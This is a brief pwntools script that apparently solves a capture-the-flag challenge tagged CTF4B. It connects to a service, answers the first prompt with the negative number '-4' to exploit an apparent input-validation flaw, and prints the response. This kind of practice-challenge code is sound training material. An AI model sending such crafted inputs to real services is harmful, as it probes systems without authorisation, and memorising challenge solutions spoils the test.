#!/usr/bin/env python3
from pwn import *

HOST = os.getenv("CTF4B_HOST", "localhost")
PORT = int(os.getenv("CTF4B_PORT", "9000"))

context.log_level = "critical"

p = remote(HOST, PORT)

p.sendlineafter(b": ", b"-4")
print(p.readline().decode(), end="")
